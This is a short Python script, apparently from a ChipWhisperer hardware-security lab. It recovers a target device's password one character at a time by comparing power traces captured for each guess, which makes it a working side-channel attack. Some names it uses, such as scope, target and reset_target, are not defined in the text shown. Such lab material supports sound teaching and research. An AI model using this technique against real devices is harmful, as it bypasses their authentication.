import chipwhisperer as cw
import numpy as np

def cap_pass_trace(pass_guess):
    reset_target(scope)
    num_char = target.in_waiting()
    while num_char > 0:
        target.read(num_char, 10)
        time.sleep(0.01)
        num_char = target.in_waiting()

    scope.arm()
    target.write(pass_guess)
    ret = scope.capture()
    if ret:
        print('Timeout happened during acquisition')

    trace = scope.get_last_trace()
    return trace

def attack():
    guessed_pw = ""

    for _ in range(0, 5):  
        biggest_diff = 0
        biggest_char = '\x00'
        ref_trace = cap_pass_trace(guessed_pw + "\x00\n")
        
        for c in 'abcdefghijklmnopqrstuvwxyz0123456789': 
            trace = cap_pass_trace(guessed_pw + c + "\n")
            diff = np.sum(np.abs(trace - ref_trace))

            if diff > biggest_diff:
                biggest_diff = diff
                biggest_char = c
                
        guessed_pw += biggest_char
        print(guessed_pw)

if __name__ == "__main__":
    attack()